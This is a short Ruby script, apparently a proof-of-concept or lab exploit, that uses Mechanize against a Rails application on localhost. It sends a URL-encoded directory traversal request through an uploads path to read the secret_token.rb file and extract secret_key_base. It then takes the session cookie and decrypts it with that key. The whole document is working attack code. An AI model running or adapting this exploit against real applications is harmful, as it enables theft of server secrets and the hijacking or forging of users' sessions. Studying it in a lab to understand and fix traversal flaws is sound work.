require 'helpers/encryption_helper'
require 'mechanize'

include Helpers::Encryption

Mechanize.new.instance_eval do
  # Retrieve the secret key base through directory traversal
  puts '[+] Retrieving secret key base'
  get 'http://localhost:3000/uploads/%2E%2E%2Fconfig%2Finitializers%2Fsecret_token.rb'

  secret_key_base = page.body.match(/secret_key_base = '(.*)'/)
                      .captures
                      .first
  
  # Retrieve the session cookie  
  puts '[+] Retrieving session cookie'                    
  get '/'
  cookie = cookie_jar.cookies.first.value


  # Decrypt the session cookie
  cleartext_cookie = decrypt_session_cookie(cookie, secret_key_base)
  puts '[+] Success'
  puts cleartext_cookie
end
